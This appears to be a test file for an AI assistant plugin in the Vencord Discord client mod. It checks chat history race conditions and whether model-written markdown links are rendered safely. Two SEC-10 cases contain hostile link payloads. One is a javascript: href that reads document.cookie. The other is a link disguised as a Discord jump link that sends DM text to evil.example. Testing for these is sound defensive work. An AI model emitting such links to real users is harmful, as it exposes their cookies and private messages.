/*
 * Vencord, a Discord client mod
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import * as RealReact from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import * as webpackCommon from '@webpack/common';
import { ChatMessage } from '../components/ChatMessage';
import { AIAssistantAgent } from '../llm/agent';
import { modelLifecycle } from '../llm/modelLifecycle';
import { ChatService } from '../services/chatService';
import { deleteHistorySession, selectHistorySession } from '../components/sidebarActions';
import { DEFAULT_SETTINGS } from '../settings';
import { getSessionById, getSessionsForChannel } from '../storage/chatHistory';
import { AssistantChatMessage } from '../types';
import { assert } from './assert';

function withMemoryLocalStorage<T>(fn: () => Promise<T>): Promise<T> {
  const had = typeof (globalThis as any).localStorage !== 'undefined';
  const memory = new Map<string, string>();
  if (!had) {
    (globalThis as any).localStorage = {
      getItem: (key: string) => memory.get(key) ?? null,
      setItem: (key: string, value: string) => { memory.set(key, String(value)); },
      removeItem: (key: string) => { memory.delete(key); },
      key: (index: number) => Array.from(memory.keys())[index] ?? null,
      get length() { return memory.size; },
    };
  }
  return fn().finally(() => {
    if (!had) delete (globalThis as any).localStorage;
  });
}

/** Renders a component to static markup with the real React behind the `@webpack/common` mock, restoring the mock afterwards. */
function renderWithRealReact(element: () => any): string {
  const mockReact = (webpackCommon as any).React as Record<string, any>;
  const saved = { ...mockReact };
  const originalError = console.error;
  try {
    if (mockReact !== (RealReact as any)) Object.assign(mockReact, RealReact);
    console.error = () => undefined; // React warns about javascript: URLs; the markup is what we assert on.
    return renderToStaticMarkup(element());
  } finally {
    console.error = originalError;
    if (mockReact !== (RealReact as any)) {
      for (const key of Object.keys(mockReact)) delete mockReact[key];
      Object.assign(mockReact, saved);
    }
  }
}

function assistantMessage(content: string): AssistantChatMessage {
  return { id: 'ast_ui', role: 'assistant', content, timestamp: 0, steps: [], citations: [] };
}

/** SEC-10 (UI side): a model-emitted markdown link renders its raw href, including non-http schemes. */
async function sec10ScriptSchemeHref(): Promise<void> {
  const markup = renderWithRealReact(() =>
    RealReact.createElement(ChatMessage, { message: assistantMessage('see [source](javascript:alert(document.cookie))') }));
  assert(!/href="javascript:/i.test(markup), `SEC-10 javascript: href rendered: ${markup.match(/<a [^>]*>/)?.[0]}`);
}

/** SEC-10 (UI side): link text can impersonate a Discord jump link while the href points elsewhere; the real host is only in the title tooltip. */
async function sec10SpoofedLinkHostHidden(): Promise<void> {
  const markup = renderWithRealReact(() =>
    RealReact.createElement(ChatMessage, {
      message: assistantMessage('[https://discord.com/channels/1/2/3](https://evil.example/?d=secret%20dm%20text)'),
    }));
  const anchor = markup.match(/<a [^>]*>([\s\S]*?)<\/a>/);
  const visibleText = anchor?.[1] ?? '';
  assert(visibleText.includes('evil.example'),
    `SEC-10 external link shows only "${visibleText}" while its href is https://evil.example/... (host not visible)`);
}

/**
 * UI-02: selecting the active chat in the history drawer during a run (SidebarPanel.handleSelectSession ->
 * chatService.switchSession(storedCopy)) swaps in a stale copy; the next send overwrites the finished answer.
 */
async function ui02StaleCopyOverwritesAnswer(): Promise<void> {
  const originalAcquire = modelLifecycle.acquire;
  const originalRun = AIAssistantAgent.prototype.run;
  await withMemoryLocalStorage(async () => {
    try {
      let releaseRun: () => void = () => undefined;
      let runCount = 0;
      modelLifecycle.acquire = async () => () => undefined;
      AIAssistantAgent.prototype.run = function () {
        runCount++;
        if (runCount === 1) {
          return new Promise((resolve) => {
            releaseRun = () => resolve({ content: 'FINISHED ANSWER', steps: [], citations: [] });
          });
        }
        return Promise.resolve({ content: 'follow-up answer', steps: [], citations: [] });
      } as any;
      const channelId = `hunt_ui02_${Date.now()}`;
      const service = new ChatService({ ...DEFAULT_SETTINGS });
      const session = await service.initSession(channelId);
      const sending = service.sendMessage('first question');
      await new Promise((resolve) => setTimeout(resolve, 20));
      // User opens the history drawer (getSessionsForChannel) and clicks the highlighted active entry.
      const list = await getSessionsForChannel(channelId);
      const storedCopy = list.find((s) => s.id === session.id)!;
      assert(Boolean(storedCopy), 'fixture: active session listed');
      const switched = selectHistorySession(service, storedCopy);
      // LLM-11 UI half: deleting from the drawer mid-run is refused.
      const deleted = await deleteHistorySession(service, session.id);
      assert(!switched && !deleted, `UI-02 history actions ran during generation (switched=${switched}, deleted=${deleted})`);
      releaseRun();
      await sending;
      const afterRun = await getSessionById(session.id);
      const shown = service.getActiveSession()!.messages[1];
      // Follow-up send uses the stale copy.
      await service.sendMessage('follow-up');
      const afterFollowUp = await getSessionById(session.id);
      const firstReply = afterFollowUp?.messages[1];
      assert(firstReply?.content === 'FINISHED ANSWER',
        `UI-02 stored answer after run: "${afterRun?.messages[1]?.content}"; UI showed "${shown?.content}" (isStreaming=${shown?.isStreaming}); after follow-up the stored first reply is "${firstReply?.content}" (isStreaming=${firstReply?.isStreaming})`);
    } finally {
      modelLifecycle.acquire = originalAcquire;
      AIAssistantAgent.prototype.run = originalRun;
    }
  });
}

const CASES: Array<[string, () => Promise<void>]> = [
  // SEC-10 cases are registered with the SEC-10 fix.
  ['UI-02 stale history copy overwrites answer', ui02StaleCopyOverwritesAnswer],
];

export async function runHuntUiTests(): Promise<void> {
  const failures: string[] = [];
  for (const [name, run] of CASES) {
    try {
      await run();
      console.log(`✅ huntUi: ${name}`);
    } catch (error) {
      const text = error instanceof Error ? error.message : String(error);
      failures.push(text);
      console.log(`❌ huntUi: ${name}: ${text}`);
    }
  }
  assert(failures.length === 0, `huntUi: ${failures.length} failing case(s)`);
}
